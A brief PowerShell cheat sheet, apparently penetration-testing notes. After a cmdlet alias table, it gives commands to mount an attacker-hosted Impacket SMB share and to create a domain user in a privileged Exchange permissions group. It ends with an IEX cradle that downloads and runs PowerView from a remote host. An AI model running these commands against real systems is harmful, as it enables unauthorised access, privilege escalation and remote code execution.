|Command let|Description/Alias|
|-|-|
|`Get-ChildItem`|ls, dir|
|`Get-Alias`|Display all alias|
|`Set-Location`|cd|
|`Get-Content`|cat, type|
|`Clear-Host`|cls, clear|
|`Copy-Item`|cp, copy|
|`Remove-Item`|rm, del|
|`Invoke-WebRequest`|curl|
##### Mount SMB on Windows from Linux
__Start Impacket's SMB server__
```bash
smbserver.py kick-share $(pwd) -smb2support -user kickass101 -password pass
```
__Create Credential Object__
```powershell
$pass = convertto-securestring 'pass' -AsPlainText -Force
```
```powershell
$creds = New-Object System.Management.Automation.PSCredential('kickass101', $pass)
```
__Mount the SMB share__
```powershell
New-PSDrive -Name -PSProvider FileSystem -Credential $creds -Root \\$IP\kick-share
```

##### Create and add user to a group
__Create User acct__
```powershell
net user kickass101 Password321 /add /domain
```
__Add user to a group__
```powershell
net group "Windows Exchange Permissions" /add kickass101
```

##### Download files from server
```powershell
IEX(New-Object Net.WebClient).downloadString('http://$IP/Powerview.ps1')
```